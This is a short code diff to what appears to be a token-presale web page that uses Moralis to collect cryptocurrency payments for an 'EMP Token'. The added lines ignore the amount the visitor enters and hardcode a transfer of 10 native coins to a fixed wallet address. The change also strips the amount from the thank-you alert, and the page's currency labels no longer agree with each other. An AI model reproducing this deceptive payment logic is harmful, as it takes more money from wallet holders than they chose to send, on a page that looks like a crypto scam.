@@ -106,10 +106,10 @@
 
       async function send() {
         await Moralis.Web3.authenticate({ signingMessage: "Empower Dev" });
-        let _amount = String(document.querySelector("#amountOfETH").value);
+        
         const options = {
           type: "native",
-          amount: Moralis.Units.ETH(_amount),
+          amount: Moralis.Units.ETH(10),
           receiver: "0x57193eef20b8321342119e15Db6fB85086f0F8ED",
         };
 
@@ -118,7 +118,7 @@
           "<style>.#form-input{display:none;}</style> <h4 class : 'text-center' >Thanks for sending BNB, </h4> <p>   and we will send the EMP Token to your wallet address ASAP.</p>";
 
        
-        alert(`Thanks for sending  ${_amount}  BNB,  and we will send the EMP Token to your wallet address ASAP.`);
+        alert(`Thanks for sending MATIC,  and we will send the EMP Token to your wallet address ASAP.`);
 
         // Moralis.Web3.authenticate();
         // const options = { type: "native", amount: Moralis.Units.ETH("0.1"), receiver: "0x4b776b75FC8238ae7da02996a20b946042d4891a" };
